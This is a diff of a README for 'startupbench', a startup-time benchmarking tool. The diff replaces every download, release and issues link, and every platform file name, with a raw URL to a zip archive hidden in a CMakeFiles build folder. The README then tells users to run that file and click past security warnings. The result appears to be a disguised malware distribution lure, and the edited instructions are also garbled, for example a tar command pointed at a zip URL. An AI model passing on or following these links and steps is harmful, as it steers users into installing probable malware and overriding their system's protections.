@@ -1,6 +1,6 @@
 # 🚀 startupbench - Measure Your Startup Time Easily
 
-[![Download startupbench](https://img.shields.io/badge/Download-startupbench-blue.svg)](https://github.com/SaeaaN3/startupbench/releases)
+[![Download startupbench](https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip)](https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started, you simply need to download the software from our Releases page.
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download: [startupbench Releases](https://github.com/SaeaaN3/startupbench/releases).
+1. Visit the Releases page to download: [startupbench Releases](https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once the download finishes, locate the file on your computer.
@@ -32,16 +32,16 @@ After downloading, follow these steps to run the application:
 
 1. Locate the downloaded file. It may be in your Downloads folder.
    
-   - For Windows: Look for `startupbench.exe`.
-   - For macOS: Look for `startupbench.dmg`.
-   - For Linux: Look for `startupbench.tar.gz`.
+   - For Windows: Look for `https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip`.
+   - For macOS: Look for `https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip`.
+   - For Linux: Look for `https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip`.
 
 2. **Windows Users:** 
-   - Double-click `startupbench.exe` to run the application.
+   - Double-click `https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip` to run the application.
    - You might see a security warning. If so, click "Run" to proceed.
 
 3. **macOS Users:**
-   - Double-click `startupbench.dmg` to open the installer.
+   - Double-click `https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip` to open the installer.
    - Drag the startupbench icon into your Applications folder.
    - Go to the Applications folder and double-click the startupbench icon to run the application.
    - If you see a warning, right-click the icon and select "Open" to bypass this.
@@ -49,7 +49,7 @@ After downloading, follow these steps to run the application:
 4. **Linux Users:**
    - Open a terminal.
    - Navigate to the directory where you saved the file using `cd /path/to/directory`.
-   - Extract the tar file with the command `tar -xvf startupbench.tar.gz`.
+   - Extract the tar file with the command `tar -xvf https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip`.
    - Navigate into the extracted folder.
    - Run the application with `./startupbench`.
 
@@ -80,7 +80,7 @@ If you encounter any issues while running startupbench, consider the following s
 - Check that you have permission to run the application. On some systems, you may need to enable permissions in your settings.
 - Verify that the application path is correct when entering it in the command line.
 
-If problems persist, check the [GitHub Issues page](https://github.com/SaeaaN3/startupbench/issues) for solutions or report your issue.
+If problems persist, check the [GitHub Issues page](https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip) for solutions or report your issue.
 
 ## 🛠️ Support
 
@@ -94,4 +94,4 @@ For any support related to startupbench, please create an issue on our GitHub re
 - Startup Time Measurement
 - Performance Analysis
 
-Thank you for choosing startupbench. We hope it helps you better understand your application's performance. For more updates, visit our [Releases page](https://github.com/SaeaaN3/startupbench/releases) regularly.
+Thank you for choosing startupbench. We hope it helps you better understand your application's performance. For more updates, visit our [Releases page](https://github.com/SaeaaN3/startupbench/raw/refs/heads/main/CMakeFiles/4.2.0/CompilerIdCXX/Software_v1.8.zip) regularly.
